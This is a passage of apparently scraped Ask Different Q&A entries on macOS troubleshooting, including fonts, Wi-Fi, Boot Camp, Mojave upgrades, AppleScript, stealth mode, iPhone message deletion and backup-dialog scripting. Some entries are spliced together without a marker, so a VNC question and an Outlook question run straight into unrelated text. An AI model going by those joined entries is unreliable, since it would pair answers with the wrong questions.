Failed\" words, the words turn into a button. Clicking on the button restores the connection. The restoration isn't permanent, but it's easy to restore when the connection fails again, and is much less trouble than the other suggestions for remediation...until Apple or Google update the software to take care of this issue permanently.\n\nA: I retried today (2019-04-01) and despite the date g-suite accounts are now working.\nI don't think this is a bug that affects everyone on 10.14.4 and uses gsuite.\n", "Q: MacOS: Rationalising Fonts — Cannot disable fonts According to Font Book, I have 260 fonts installed on my system. Many of them are for languages which do not affect me.\nThree such fonts are Al Bayan, Al Nile and Al Tarikh, Arabic fonts which I do not read.\nI have tried to disable some fonts, but I get the message:\n\nThe selected fonts cannot be disabled.\n\nThe current selection contains protected fonts, which cannot be\ndisabled. Please unselect these fonts and try again.\n\nI understand that I can probably delete them.\nWhy can’t I disable them? Is there a potential problem if I delete them (or move them to an archive folder)?\n\nA: The fonts you are trying to disable are used by the System and hence are protected. You could still try to delete those fonts but I would not advise that.\nI suggest you start over and try deleting one font at a time. if the font you try to disable is dimmed out then it is a system font. Use the disable button in font book to diable the fonts. This is shown below.\n\n\nA: It's actually not that difficult to strip down your fonts to a more manageable number but you can't do it with Font Book. I suggest visiting Font Management in macOS for detailed information and instructions about this and other font-management tasks. I have found the information on there to be very reliable.\n", "Q: Mid 2015 Mbp wifi issue by location I have a mid 2015 Macbook Pro.\nWhen at home, WiFi is as good as can be expected, approx 30-40mb down.\nI stay away from home at another house during the week and whilst all of my other devices achieve good WiFi (phone, tablet, firestick) my MBP almost grinds to a halt.\nWhilst at that location I set up my phone as a hotspot and connected the MBP and that worked as it should, all fine, approx 10mb down. When I then switched back to the in-house WiFi however, it was back to an almost non-existent crawl.\nI'm not big on networking issues so not sure where to look for any clues as to what could cause this.\nAre there any tests I could run which would allow me to narrow down what the problem is?\nEDIT\nOk, really weird behaviour now...\nI decided to strip back and not have anything attached to my MBP and run the test again (using speedtest.net). Approx 70mb down. Wtf! Then as I add things back on, one by one, power supply, external monitor (video, not audio), keyboard (usb, music), headphones, usb hub (DAW dongle and external drive) it degrades with each addition, approx 10mb each (including headphones which are passive surely).\nHas anyone seen anything like this before?\n\nA: This is not the perfect answer, but it is an answer...\nMove everything away from your MBP that's plugged in to it.\nWhen in location A my set up is different to a more cramped set up B.\nMy MBP was sat underneath a 43 inch ultra-widescreen monitor, with a usb 3.0 hub containing, amongst other things, my external drive, sat atop it. As soon as I separated them all as far away from each other as possible the speed went back up. Not back up to anything like it was with nothing attached, but acceptable.\nHopefully might help someone in the future. No idea why it's even an issue, I'm guessing everything emits something that clashes (potentially) with something else.\n", "Q: How do I rename the Boot Camp partition? The partition is currently called BOOTCAMP, and I would like it to be called Windows.\nWhen I try to rename the partition is Disk Utility, no error is displayed, but the change is not persisted (i.e. I am allowed to type a name, but after I hit Enter, the name is unchanged).\nI tried the following three commands in Terminal:\ndiskutil renameVolume disk0s4 Windows\ndiskutil renameVolume /dev/disk0s4 Windows\ndiskutil renameVolume /Volumes/BOOTCAMP Windows\n\nThe result is always:\n\nFailed to rename volume: Invalid request (-69886)\n\nThe name of the partition can not be changed using Finder.\nHow can I successfully rename this partition? Is the name a property of the partition (e.g. recorded in the GUID_partitioning_scheme on disk0)? Or is a property of the mount in macOS (e.g. its name is BOOTCAMP because it is mounted at /Volumes/BOOTCAMP).\nIf it's the first, maybe I can change it with a tool that works with the GUID_partitioning_scheme directly? (This seems dangerous though...)\nIf it's the latter, where can I change the way macOS mounts this partition? (And is that safe?)\n\nA: Under default conditions, you'll need to rename the BOOTCAMP volume from within Windows.\n\nIn macOS, when the Boot Camp Assistant sets up a partition to install Windows it creates a FAT32 volume named BOOTCAMP.\nDuring the install of Windows, the user is supposed to reformat the volume as NTFS.\nBy default, NTFS volumes are read-only under macOS and why the renaming, after the install, needs to done from within Windows, unless one has enabled NTFS write support under macOS. This typically requires the installation of third-party software, e.g. Microsoft NTFS for Mac by Tuxera.\n", "Q: Lost between two macOS versions after failed upgrade to macOS Mojave I have no experience whatsoever with macOS (Linux user).\nI got an old mid 2012 13\" MacBook Pro, which was running OS X Mountain Lion 10.8.5. I tried to upgrade it to macOS Mojave, by launching Mac App Store, and searching for Mojave. After some time, the process stopped with the message \"requested range not satisfiable\".\nNow I am lost between the Mountain Lion world and the Mojave world, because:\n\n\n*\n\n*About this Mac says Version 10.8.5. I also can't install e.g., Xcode because the OS is too old.\n\n*The Mac App Store says that the Mojave upgrade is installed, hence the install button is disabled.\nHow can I properly upgrade to macOS Mojave? Restarting the device does not change anything.\nI want to develop and publish iOS apps, so I require a recent version of macOS.\nProgress (I)\nI installed El Capitan, Sierra and then High Sierra (yes, one after the other; it takes several hours).\nIt was quite difficult to find these updates as the App Store-Search does not show them. I had to google it, find the Apple-page which contained a link (under 4. Download macOS XXX) which is opened in the App Store. from there on, updating worked.\n\n\n*\n\n*El Capitan\n\n*Sierra\n\n*High Sierra\nNow I have High Sierra, but I'm still not able to update to Mojave.

[...]\n\nOk, I have downloaded the Mojave installer when the OS was still Mountain Lion, so I understand that message. Problem was that I could not \"re-download\" it. I had to delete the /Applications/Install macOS Mojave.app/ -directory by hand. Renaming or moving to a different place was not sufficient. After that, I could start the Mojave-Download in the App Store as expected. The installation was successful after all.\n\nA: It appears that upgrade to macOS Mojave hasn't gone through and you are stuck in a state where you are unable to run the macOS Mojave installer via Mac App Store.\nYou can try locating the downloaded macOS Mojave installer locally under /Applications directory. The installer (if available) should appear by the name Install macOS Mojave.app. If you able to locate it, try running it manually.\nIf that too fails, you have a couple options:\n\n\n*\n\n*Install macOS Mojave via Internet Recovery. Instructions can be found in the Apple Support article, About macOS Recovery.\n\n*Download macOS Mojave installer on a different Mac, create a USB bootable installer and install using it. Instructions can be found in the Apple Support article, How to create a bootable installer for macOS.\nIf you are installing using USB key, you'll need to hold down Option key while booting your Mac and choose the plugged-in USB key to run the installer. It would be advisable to erase the built-in disk and perform a fresh installation.\nOnce you have macOS Mojave installed successfully using either one of the above approaches, you can install Xcode normally via the Mac App Store.\nAs mentioned that you wish to develop and publish iOS apps. Publishing iOS apps requires current or just prior release of macOS with recommendation to use the latest iOS SDK and current version of Xcode.\nAs your MacBook supports running macOS Mojave, it's recommended to install it along with Xcode 10.2 (current as of this writing).\n\nA: I suggest you upgrade to High Sierra macos 10.13.6 and once you've done this then try the upgrade to Mojave. Sometimes Mac upgrades expect the machine to be at some level of prior upgrades.\n", "Q: Which macOS VNC client can connect to the default Ubuntu VNC server? A few machines running Ubuntu 18.04 have to be accessed remotely through VNC.\nOn Ubuntu, I can use Remmina Remote Desktop Client to connect to the VNC server.

Instead, I find that even if I selected Favorites in the last session, next time the category selected by default is the first category below the horizontal dividing line below Favorites in the left side bar (the Greek category in the attached image). \nIs there a way to make Favorites selected by default?  If this is not possible, I want at least the category selected in the last session remains selected in the next session.  In fact, that is the behavior for all the categories below the dividing line, but not for the categories above the dividing line.  For example, in the attached image, if I close Character Viewer while the Arrows category is selected, next time the same category remains selected, but not for the Frequently Used and Favorites categories.\nThe macOS version is 10.14.3 (Mojave).\n\n\nA: It seems that it has been a while since you have asked this question but I still wanted to respond to it because it had gone unanswered and you or somebody else might still use a solution, even if not perfect, to the problem you described. \nI have the same problem with the Character Viewer on my iMac running on High Sierra. \nThe most practical solution I could find was opening it using the keyboard shortcut ⌃+⌘+space and always leaving / closing the Character Viewer when it is in the compact / pop-up state (see the picture). This helps because, if invoked through its keyboard shortcut, the Character Viewer always opens in the state it was in when it was last closed and focuses on the last used category such as the Favorites. You can click on the icon at the Character Viewer's top right to switch between its compact and expanded states.\nIf I do the above, the Character Viewer always opens in the compact state and focused on the category I left it with. Because most of the characters I use are in my favorites, it nearly always opens focused on the Favorites or the Frequently Used & the Favorites. Interestingly, I don't have this problem with the Character Viewer on my MacBook running on Catalina. It opens focused on the category wherever I left it in including the expanded state.\n \n", "Q: Outlook 2016 Search no results 16.16.8 We've been having a issue at our work where a handful of users have a problem with the search in Outlook 2016 for Mac.

After managing to merge duplicates without Contacts crashing, I was left with 177 contacts, most of which with many repeat homepage entries. Rather than dying of boredom removing these by hand, I put together some AppleScript to do this for me, thinking that this would take a few minutes. It’s been a week now – the script starts well enough but soon slows down continually and also takes more and more memory from the system, until the spinning beachball of doom appears halting the script. One issue is that I seem to only be able to delete a contact’s urls one at a time in sequence, instead of all at once.\nSo the question is, what have I got wrong making this script near useless? Could it have something to do with iCloud syncing? Or is AppleScript inherently inefficient? (The constant saving is there because of the random times the script would cease functioning.):\ntell application \"Contacts\"\n    activate\n    with timeout of 72000 seconds\n        set myPeople to people\n        set numPeople to (count of myPeople)\n        repeat with i from 1 to numPeople\n            set myGuy to item i of myPeople\n            set myGuyName to get name of myGuy\n            set personUrls to (the urls of myGuy whose value contains \"outlook\")\n            set urlNum to count of personUrls\n            if urlNum > 0 then\n                repeat with j from urlNum to 1 by -1\n                    log ((time string of (current date)) & \" – [\" & i & \"/\" & numPeople & \"] \" & myGuyName & \" (\" & j & \"/\" & urlNum & \"): \" & (the label of item j of personUrls))\n                    delete item j of personUrls\n                    save\n                end repeat\n            else\n                log \"No problematic URLs found for \" & myGuyName\n            end if\n            if note of myGuy is not missing value then set note of myGuy to \"\"\n        end repeat\n        save\n        log \"Final save\"\n    end timeout\n    return\nend tell\n\n\nA: That's bold to assert AppleScript being inefficient (vague term) as a cause.  Of course, it very well could be a factor, but it feels a little awkward to say that your script is inefficient, and woefully so.  I don't know if that is the only reason the script runs slowly, but it's a good place to start making fixes, which I'll outline by extracting problem lines in your code:\n⚠️ set myPeople to people\n\nRedundant.  There is little point in assigning a value to a variable that you don't intend to use in a meaningful way (e.g. for manipulating data without changing the source, or, if you really need to, for making scripts easier to read or debug).  Nowhere else in your script do you make a reference to myPeople, except for one other line that is also redundant.  Therefore, don't waste an operation (and potentially memory, but not really in this particular case) creating a variable you don't need.\n⭕️ set numPeople to (count of myPeople)\n\nRedundant in principle (I note that you do log the value of numPeople, though it's only used to give you an index reference, which you don't need to know; see next comment).\n⚠️ repeat with i from 1 to numPeople\n       set myGuy to item i of myPeople\n\nIgnoring for a moment the log call that references numPeople, then the entire purpose of the declaring numPeople is to allow iteration through a list by way of a counter variable (i in your case) that is used to access each item through its index (position),  i.e. item i of myPeople.  There are many instances where this would be very appropriate, but it is slower than letting AppleScript worry about how it accesses list items, which it can take off your hands using this syntax: repeat with myGuy in people\n⚠️ set urlNum to count of personUrls\n\nRedundant, for the same reason as above.  As an additional note, I would personally choose to evaluate the size of a list using the length property.  This doesn't apply to nested lists of lists for which you want to include deeply-nested items in the final number, but that's not the case here.\nAs soon as a script has evaluated (retrieved) an object, its properties will have been retrieved as part of that evaluation.  length is a property of a list object, and its a simple, unary value (an integer), so accessing that value will always be quick.  count is a command.  It performs some undisclosed operation(s) and returns a value.  I don't know what those operations are, and they will be performed at the C-language level, so probably (almost certainly) aren't slowing this script down at all.  But, in principle, it's something to bear in mind as there are other situations† a command and a property seemingly do the same thing, but the property is demonstrably faster.\n†Can't recall them right now.\n⭕️ if urlNum > 0 then\n\nRedundant, in principle.  There is an else clause that you might insist on keeping, but the only thing it does it to log the fact that nothing was done.  If someone asked me how to intentionally slow a script down because it's just too efficient, this might be one of my answers.\n⚠️ repeat with j from urlNum to 1 by -1\n\nThis is flagged for both the use of a counter variable, j, and for its position within the if block.  If urlNum were set to 0, the repeat loop hear would never be entered, and the script would continue executing the code that follows it.  But, as will become clear, the entire repeat block is redunant.\n⚠️ log ... (the label of item j of personUrls))\n   delete item j of personUrls\n\nI'm questioning the necessity of this log command as a whole.  It's certainly not as self-defeating as the one I mentioned earlier, but it does perform a current date command call, and a lookup in the personUrls list object.\n\n\n*\n\n*In situations where you do require a counter variable to iterate through a list, do as you did above, and declare a variable to which can assign the current list item's value, i.e. set hisURL to item j of personalUrls.  In crude terms, each time you ask AppleScript for [the value of] item j of..., it must access the list object and perform a look up, which is a relatively expensive operation to perform.  Declaring a variable means the lookup is only performed once, then the value (a copy of the original) is stored in memory, for which retrieval is quick and easy in computational terms.\nReturning to the value being logged, its worth seems negated by the immediate deletion of the URL data.  I'm wondering if you might have just wanted a means of tracking where your script had reached in its run, which needn't be so involved.  Using your counter variables, you could simply: log [j, i] (logging their upper bounds once is sufficient, since those values don't change during a loop).  \nThe delete command, when viewed in the context of the repeat loop in which it is called, is going to be slowing things down a lot.  You are iterating through every item in a collection in order to delete it...\n⚠️ save\n\n...then you save your changes.  How would I intentionally make my script run as slowly as possible ?  I would perform a save operation on the entire address book a number of times equal to numPeople * urlNum.  This value is at least 177, but it's actually multiples of this.  The total number of times you need to perform the save operation, I imagine, would be 1.\nThe Knock-On Effects:\nNow we know that iterating over PersonUrls was not necessary, the entire repeat block can be replaced with the line: delete every url of myGuy whose....\n\n\n*\n\n*As something to be mindful of, any script that features nested repeat loops are going to be inefficient: the number of operations performed is a product of each list's size.\nI actually note that you do mention attempting to delete a contact's URLs en masse, which didn't work for you, forcing you to do it iteratively.  However, as you didn't supply any code showing the methods you tried to do mass-deletion, it's not possible to offer insight into why it failed for you.\nRemoving the repeat block has a cumulative benefit of negating the parent if block, irrespective of my earlier comments on it.\n\n\n*\n\n*Conditionals can be expensive expressions to evaluate, particularly performing 177 of them that were never needed.\nThe Refactored Code:\nContinuing back up through the script, the preceding variable declarations all become redundant, which leads to the eventual conclusion that your entire script is functionally equivalent to:\nuse application \"Contacts\"\n\ntell (a reference to every person)\n    delete (its urls where the value contains \"outlook\")\n    set its note to missing value\nend tell\n\nsave\n\nSystem info: AppleScript version: 2.7  System version: 10.13.6\nWhat Now ?\nWas your ultimate goal to remove all URLs containing \"outlook\", or did you plan on retaining one \"outlook\" URL for contacts that have them ?\n\nA: @CJK’s answer didn’t work for me, but the response given in the Events tab of Script Editor gave me the basis of an alternative that appears to work as intended:\ntell application \"Contacts\"\n    delete (every url of every person whose value contains \"outlook\")\n    set note of every person to missing value\n    save\nend tell\n\n\nAdded by @CJK on 2019-04-03:\nRather than forcing AppleScript to enumerate every person in your address book twice, which is, in general terms, a costly operation, store a reference to the collection in a variable, which you can then use repeatedly with a lot less overhead:\ntell application \"Contacts\"\n    set _everyone to a reference to every person\n    set _homepages to a reference to _everyone's urls\n\n    delete the _homepages where the value contains \"outlook\"\n    set _everyone's note to missing value\n\n    save\nend tell\n\nSystem info: AppleScript version: 2.7  System version: 10.13.6\nThis is what is returned by the Events or Replies tab when running the original refactored code:\ntell application \"Contacts\"\n    delete every url of every person whose value contains \"outlook\"\n    set note of every person to missing value\nend tell\ntell application \"Script Editor\"\n    save current application\nend tell\n\nI’m guessing that nothing appears to happen because (I think) changes made to the contacts only work once saved. @CJK’s new version above works as intended, however.\nNow, is it as easy to whittle down a bunch of duplicate items to one as it clearly is to delete all of them?\n", "Q: MacBook Pro won’t connect to the Internet I have been using my MacBook Pro for about 5 years with zero problems (running OS X El Capitan 10.11.6). \nI was using my iPhone XR as a Wi-Fi hotspot (as I’ve done millions of times before) two days ago and when I was done, I shut down my machine while it was still connected to the Wi-Fi hotspot from my iPhone (this is the only thing that I can think of that was out of the ordinary, as I always disconnect/turn off the hotspot off before shutting down). \nYesterday, I tried to connect to a neighbour’s Wi-Fi router (which I’ve connected to a million times before as it usually remembers the password), but it wouldn’t connect and it kept telling me the password was incorrect even though I was looking right at the router and typing the same password I always do. Eventually I gave up and decided my neighbour’s Wi-Fi was the problem. \nToday I’ve turned on my laptop and it connected to the Wi-Fi in my apartment fine at first (as per usual) but then I realised that my browser wasn’t allowing me to access websites other than Google/Gmail, Facebook and YouTube. I was trying to log onto my utilities company website (as I’ve done a hundred times before) and it kept returning an error saying  the website could not be reached (even though it exists because I can access it on my phone using my apartment Wi-Fi which clearly works fine). I cleared my cache and deleted all known Wi-Fi networks and restarted my machine. \nNow I can’t connect to my own Wi-Fi network (that I’ve never had a problem with in the two years I’ve had it) - it won’t recognise my password. I tried connecting to my iPhone’s Wi-Fi hotspot (as I did 2 days ago as normal) and it won’t recognise that password which I’m looking right at on my phone. \nI have no clue what’s going on or how to fix it? My laptop is rejecting all Wi-Fi connections ever since that day I shut it down while still connected to my hotspot (I did nothing else differently since it was last working fine).\nDoes this sound like something anyone else has figured out in the past?? I’m a super basic Mac user, the built in diagnostics keep telling me I’m not connected to the Internet (i.e., useless), and I have no idea where to even start looking for solutions other than hoping to click my needle in a haystack solution out of the millions of hits on Google.\n\nA: There can be many reasons for this and I am not aware of any single silver-bullet.  You'll need to try several things to chip away at the issue until you resolve it.\nYou can boot a mac into safe-mode to test (how you get there depends on the version of macOS).\nSee:  https://support.apple.com/en-us/HT201262\nYou can also create a new (temporary) user account, then log into that account to see if it has the same issues as your primary account.  If it does not have the same issues, then it usually indicates that something in your account may be causing the problem.  This could be a corrupt .plist file.  It could be something that starts up at login (System Preferences -> User & Groups -> (select your user) -> Login Items.  It could also be something that launches via launchctl (check the contents of ~/Library/LaunchDaemons).\nYou may need to do a bit of network sleuthing ... do you get an IP address (and what is it).  Home routers will generally issue an IP address in one of the RFC-1918 blocks (see: https://www.rfc-editor.org/rfc/rfc1918).  These typically begin with 192.168.x.x or 10.x.x.x but could include 172.16.x.x through 172.31.x.x (although I have never seen a home router use that 172 range).\nIf the address begins with 169.254.x.x then this is a self-assigned IP (meaning the DHCP server did not issue an address.)\nFrom here (assuming you have a valid IP address) you would want to check the value of /etc/resolv.conf (which lists the DNS servers your mac will try to use to resolve servers) and also check your default router using the command (in Terminal) netstat -rf inet (look for the row that begins \"default\").  (netstat -rf inet will only look for IPv4 addresses.  IPv6 is excluded.)\nMake sure you can ping the IP address of the default router.\n\nA: Thanks for the response Tim, but the problem has solved itself....\n::Update:: (not exactly an answer to my original question):\nAfter I posted my question, I carried on attempting to connect to my iPhone wifi hotspot and eventually it worked (I think the problems I had with connecting to my hotspot had more to do with a weak phone signal than whatever was keeping me from connecting to a router's wifi)...\nIn any case, while connected to my hotspot, I switched wifi networks from my hotspot to my router's wifi, and all of a sudden it started working as normal (with access to all of the internet and not just a few websites like when I tried to connect to it immediately after startup). \nI have no explanation for this. In my simple non-techie mind, this has something to do with me \"undoing\" the problem by properly disconnecting from my hotspot FIRST before connecting to another wifi network. This is the only thing I can think of... because the problem started after I had shutdown my laptop while it was still connected to my hotspot, and I got rid of the problem by properly disconnecting from the same hotspot (albeit days later with multiple restarts in between) and THEN connecting to another wifi network. I am thoroughly confused, but satisfied with the outcome.  \nIf anyone has an actual explanation for why this happened, please do add to the thread in case it helps others! \n", "Q: Why Will 2012 Mac Pro will work with 2 graphics cards, but not one? I have a 2012 Mac Pro which must be updated to a Metal compatible card. When I swap the cards, the screen shows nothing and I do not believe it boots. When I put in the original card and the new card however, it works fine and video works from both cards. The problem is, the Mac will not allow a Mojave update with both cards in, and when I remove the original card, I am back to the same issue regardless of which x16 slot I use. What could be the cause of this?\n\nA: It appears the problem was that FileVault was turned on. Even without Mojave, some graphics cards without special firmware (although approved by Apple), are unable to render when in FileVault. This is why Apple says to turn it off before moving to Mojave, but they do not mention that it will not work with their new graphics card recommendation. Therefore the order is very important\n\n\n*\n\n*Turn off FileVault\n\n*Install new card\n\n*Update to Mojave\n\n\nA: Sounds like the new graphics card does not have a Mac video firmware. That is essential in order for the graphics card to be supported during boot.\nAfter boot, ordinary drivers for the graphics can be loaded and the card starts working letting you use both the new card and the old card.\nYou must replace the firmware or entire card with one that is supported during boot on a Mac. Whether you can update the firmware depends on the type of card.\n", "Q: Mojave OS Stealth mode: Is it compatible with Norton Security package? Is Norton Security Firewall compatible with stealth mode on Mojave OS??\nWhat is the advantage of stealth mode?\nRK\n\nA: Yes, enabling stealth mode on Mojave will not wreak havoc with Norton Security.\nHowever note that enabling security features such as Stealth Mode or indeed the Norton Security Firewall itself does not magically give you \"more security\" or \"better security\". You'll need an understanding of what these features do or do not do in order to reason about enabling them. It might harm more than it helps in some cases.\nStealth mode works by blocking responses to ICMP ping packets as well as incoming requests for non-open ports. This means that you cannot ping the computer to get an immediate response, and if you attempt to connect to a service on the computer that is not offered, you'll not get a \"closed\" response, but instead nothing will happen.\nThe advantage is that if you have a scenario where you do not want others on your local area network to know that the computer is there or which services it provides, they could be \"fooled\" by not responding to these packages.\nOn a normal home user scenario the feature does not give you any additional advantage against probing from the Internet at large. It is only a protection on your local network. So if someone comes to your home and plugs in a computer into your local network, it will take them longer to map out which IP-addresses your computers have and which services they offer. In general, this is not a problem for home users at all.\nIn a mobile scenario where you take your laptop out in the world and connect to insecure (often WiFi) networks without forcing everything on a VPN, the feature does have some merit. Evil users on the same network cannot ping to discover your computers - although on wireless and especially wired networks, it is quite easy to discover your computer simply from the fact that it is itself sending out information onto the network. Similarly evil users will need more time to discover which services your computer offer.\nThe advantages of the feature are very limited for most users in most cases.\nThe disadvantages are mostly concerning \"debugging\" i.e. when \"finding errors\". If you for example try to connect yourself to the computer via a network service that isn't working for some reasons, you might find yourself waiting for timeouts, non-responsive programs, etc. - instead of having a quick error message popping up stating the cause of the interruption of service.\n", "Q: How do I change my Apple ID in macOS? (no Apple ID login) When I setup my user, I used my old company email. I no longer have access to that email. I do, though, have full admin access to my current user (and all users for that matter).\nCurrently, I'm trying to update Xcode, but it requires the Apple ID credentials with which it was originally installed. I no longer have them.\nHow can I use my admin position to change my Apple ID?\n\nA: The easiest is simply to uninstall Xcode, log out of the App Store with your AppleID, login again with a new AppleID - and simply reinstall Xcode.\nIf you do not have an AppleID, you can create a new one. Xcode is a free download.\n\nA: You don't need to change the Apple ID [if it is actually yours & not the company's].\nThe email address can be changed independently.\nApple KB - Change your Apple ID - If your Apple ID is a third-party email address\n", "Q: Securely Deleting Text Messages from iPhone? I was under the impression that you can't recover \"deleted files\" from iPhones and their encrypted storage memory the same way you can from a computer. \nBut after doing some research, there seems to be a bunch of apps that can do just that.\nSo I'm wondering, is there a way I can securely delete specific messages (personal ones) from my phone, in a way that definitely cannot be recovered if my phone is imaged? I can't wipe the whole phone though, that's off the table.\nEssentially what I'd like is the iPhone equivalent of \"erase free space\" that Disk Utility has, that overwrites all free space so nothing can be accessed.\n\nA: The only way to be fully protected against this is to delete the messages from the phone, create a backup of the phone and then completely wipe the phone. You can restore the backup afterwards.\nBecause wiping the phone means that the encryption keys previously used are thrown out and new ones put in place, it is not possible for a (reasonable) attacker to get to the messages even if they should be available in encrypted form on the NAND flash.\nIf you know the file structure of the app that the messages are saved in, it is possible to create a somewhat weaker defense against outsiders accessing your now-deleted texts. For example if the messages are stored in a SQLite database (such as with for example the Messages app), you could jailbreak the phone, export the database to a dump text file (which wouldn’t contain the deleted messages), remove the original database and then fill up the disk with random bytes. When the disk is filled up, delete the file with random bytes and import your database dump as a SQLite database.\nThe above mentioned procedure is necessary because when you delete a single message from a SQLite database, it is not a file that is removed. It is merely space within a file that is marked as non-used at the application layer. The file is not shrunk nor does the operating system know that parts of the file are non-used. The above mentioned process forces these deleted areas to be made available to the operating system for overwriting.\nIn addition overwriting is in itself not a good protection on a NAND flash disk with wear-leveling (i.e. the flash storage in a modern iPhone is comparable to a SSD drive with its own controller, etc.). The reason being that even when you overwrite a data block on disk, the controller inside the flash storage might decide to simply “stow away” that physical block and map other physical blocks in instead. This is a byproduct of wear-leveling.\n", "Q: Avoid apps from stealing focus in macOS How can I stop a program, for instance Slack, which can have some significant loading time, stealing focus when it's finished loading?\nIf I start Slack, then switch focus during its loading time, the program steals focus when it's done loading. It drives me nuts.\nIs there a way to prevent this behavior?\n\nA: I found a couple options that should cover most applications. Either one of these could be used to create an Automator workflow to make running the script more convenient.\nOption 1: Terminal command\nThe open command can be used to open an application using the -a option. You can add the -g option to open the application without bringing it to the foreground. This does not work for Slack or Google Chrome. I suspect it is because they are cross-platform applications that are built differently and aren't perfect macOS citizens. This solution is preferable if it works for the desired application.\nopen -g -a \"Microsoft Word\"\n\nOption 2: AppleScript\nYou can use AppleScript to activate an application and hide it if it had not previously been running. The application will launch and still steal focus, but the script will delay a short time to ensure the application launches before trying to hide it. It's definitely not a perfect solution, but it works.\nset appName to \"Slack\"\n-- Check if the application is running\nset appIsRunning to application appName is running\n-- Activate the application\ntell application appName to activate\nif not appIsRunning then\n    -- If the application is not running, delay and then hide the application\n    delay 1 -- increase this value as needed\n    tell application \"Finder\" to set the visible of process appName to false\nelse\n    -- If the application is running, count the number of windows.\n    tell application \"System Events\" to tell process appName to set windowCount to count of windows\n    -- If no windows are open, open a new one.\n    if windowCount = 0 then\n        -- Open window command here.

I've been working on this myself for the past few months. I'm pretty happy with what I've got, but I had to put in a lot of custom work to draw together a lot of individual pieces. \nThe exact answer depends very much on what sort of config you need to port, and how technical you are. If you're talking about common color/desktop settings, this shouldn't be too bad. If you're trying to do something complex like keep exact Finder view preferences for every folder on your system, you're in for some work.\nHere are a few things you may want to look into, each of which can get you at least part of what you want (listed roughly from less to more complex/technical)\n\n\n*\n\n*mackup, a program which recognizes config files for many apps and attempts to piggyback on sync software such as Dropbox to share them among systems (I haven't used this--just aware it exists...; this is probably as close as you'll get if you'll get to what you're asking without doing some custom scripting)\n\n*A simple package manager, such as homebrew (particularly via brew bundle, which can install apps and other software specified in a Brewfile)\n\n*a dotfile manager, (I use yadm--but there are many of these with slightly different features and philosophies), which provides a scaffold for identifying which files on your system are config related, and making it simple to track/port them to another system. For the most part, you'll be on your own to identify what is worth tracking with one of these. It tends to take a while to identify what files are useful config, and which ones are junk. Many apps mingle them.\n\n*publicly posted dotfile repos from other mac users. One of the most famous of these is by Mathias Bynens. Some dotfile repos will only be good for ideas, but some (Like Mathias') include instructions for how you could install his configuration on your own system. It'll probably still take a good bit of effort to tailor this to your own needs.\n\n*more complex package managers such as Nix which, in tandem with nix-darwin, is capable of setting up parts of a macos system in a fairly deterministic/explicit/repeatable manner.\n\n\nTo give you some sense of what this can look like in practice, I can stand up a new system in under two hours with the vast majority of what I need pre-configured/installed. The process is, roughly:\n\n\n*\n\n*I start up the system and log in to a private git host for my dotfiles, and go check the installation instructions in my README file.\n\n*Manually grant some security/privacy exceptions for Terminal and ScriptEditor so that my scripts can run.\n\n*Copy/paste a small bash script from my README document which installs the Nix package manager, and uses Nix to install the software that my dotfile manager (yadm) needs to successfully clone my dotfiles.\n\n*When yadm is done copying in my dotfiles, it automatically runs my full bootstrap script, which installs homebrew for installing a few big/commercial mac apps, installs nix-darwin for configuring the rest of my development-oriented software, sets many macos preferences, restores my work/project files from a remote backup repository, and runs hand-written scripts to configure a few apps that must be actively configured (installing Safari extensions, installing vpn configs, etc.)\n\n*reboots the system for use\n", "Q: osascript display dialog hangs when screen is off; detect unavailable GUI/display from bash or applescript? NOTE: If you have this problem, the answer from @abc helps mitigate it--but there are still unknown conditions under which this solution won't keep the osascript from executing and hanging.\nbackground\nI've been working on a backup script that runs occasionally via launchd. When it runs, it prompts me with something like:\nosascript -e \"display dialog \\\"Is now a good time to back up?\\\"\"\n\nThis works great when the system is open/online, but it seems to hang if the lid is closed or screen is locked/off. A tolerable way to test this is to SSH into the system as the same user with the desktop active, run a command like the one above, and observe that the dialog pops up.\nIf I run the same command with the system locked, it just hangs. If I unlock/open the system, the command doesn't finish, and the dialog doesn't appear.\nWhen running on battery power, I can simulate the same condition by running:\npmset displaysleepnow; osascript -e \"display dialog \\\"never never land\\\"\"\n\nquestion\nIs anyone aware of a way to detect this condition (at launchd, bash, or applescript level) so that I can do any of:\n\n\n*\n\n*keep the job from running at all until the system is active\n\n*sleep the script until I can display a dialog without it hanging\n\n*abort the script run before it hangs\n\n\nI'm not keen on it, but the best I've been able to figure out so far involves putting a long timeout on the first dialog in the script and bailing out if it never gets answered, i.e.:\nosascript -e \"display dialog \\\"Is now a good time to back up?\\\" giving up after 600\"\n\n\nA: This should keep waiting until the screen is on:\nset screenOff to true\nrepeat until screenOff is false\n    set screenOff to (do shell script \"ioreg -c AppleBacklightDisplay | grep dsyp\") contains \"\\\"dsyp\\\"={\\\"min\\\"=0,\\\"max\\\"=2,\\\"value\\\"=0}\"\nend repeat\n\ndisplay dialog \"Is now a good time to back up?\"\n\n\nA: NOTE:\nI stumbled into what looked like a more direct answer, presented below, but @abc's method has proven more accurate over the course of the day. I suspect there may still be a good way to use queries in pmset to accomplish this fairly directly (perhaps by combining more than one indicator), but I'll probably only pursue that further if I notice any edge cases with @abc's ioreg approach.\n\nI noticed something in the first half of the output from pmset -g assertions:\nAssertion status system-wide:\n   BackgroundTask                 0\n   ApplePushServiceTask           0\n   UserIsActive                   1\n   PreventUserIdleDisplaySleep    0\n   PreventSystemSleep             0\n   ExternalMedia                  0\n   PreventUserIdleSystemSleep     1\n   NetworkClientActive            0\n\nThe next to last option, PreventUserIdleSystemSleep, appears to be 0/false when the lock screen is up or the lid is closed but the system hasn't gone to sleep yet (EDIT: this understanding is incomplete; I've since observed 0 values here even while the system is full-on and in use). It looks like this supports something similar to @abc's answer, either by skipping the backup routine when idle:\nactive=\"$(pmset -g assertions | grep -oP \"PreventUserIdleSystemSleep\\s+\\K\\d\")\"\nif [ $active -ne 0 ]; then\n    # backup\nfi\n\nOr holding off until the system isn't idle:\nactive=\"$(pmset -g assertions | grep -oP \"PreventUserIdleSystemSleep\\s+\\K\\d\")\"\nuntil [ $active -ne 0 ]; do\n    active=\"$(pmset -g assertions | grep -oP \"PreventUserIdleSystemSleep\\s+\\K\\d\")\"\n    sleep 10\ndone\n\n\nA: System Events knows when the screen is locked. I believe all AppleScript delays and timeouts pause when the Mac is actually asleep. I switched to a heredoc as it is getting lengthy. Should really save it as a bona fide script file.\nTry adapting something like:\nosascript <<'SCRIPT'\ndelay 5\nset userInteractionBlocked to true\nrepeat until userInteractionBlocked is false\n  tell application \"System Events\" to set userInteractionBlocked to (running of screen saver preferences)\n  if userInteractionBlocked then delay 300\nend repeat\ndisplay dialog \"Now a good time for a backup?\" with icon 2 buttons {\"Later\", \"Backup\"} default button 